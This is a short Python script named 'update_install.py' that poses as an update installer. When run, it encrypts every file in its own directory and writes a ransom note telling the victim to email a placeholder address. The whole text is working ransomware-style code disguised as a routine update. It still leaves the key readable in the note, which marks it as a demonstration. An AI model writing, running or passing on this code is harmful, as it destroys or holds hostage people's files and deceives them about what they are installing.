# save this as update_install.py
import os
from cryptography.fernet import Fernet

def encrypt_files(directory):
    key = Fernet.generate_key()
    cipher_suite = Fernet(key)
    for root, dirs, files in os.walk(directory):
        for file in files:
            # Avoid encrypting the script itself and the key file
            if file == "update_install.py" or file == "secret.key":
                continue
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'rb') as f:
                    data = f.read()
                encrypted_data = cipher_suite.encrypt(data)
                with open(file_path, 'wb') as f:
                    f.write(encrypted_data)
                print(f"Encrypted {file_path}")
            except Exception as e:
                print(f"Failed to encrypt {file_path}: {str(e)}")
    # Save the encryption key in a text file for demonstration purposes
    with open(os.path.join(directory, 'README_FOR_DECRYPT.txt'), 'w') as f:
        f.write(f"To decrypt your files, send an email to fake@ransomware.com with your key: {key.decode()}")

if __name__ == "__main__":
    print("Starting the update installation...")
    # Automatically use the directory where the script is stored
    directory = os.path.dirname(os.path.realpath(__file__))
    encrypt_files(directory)
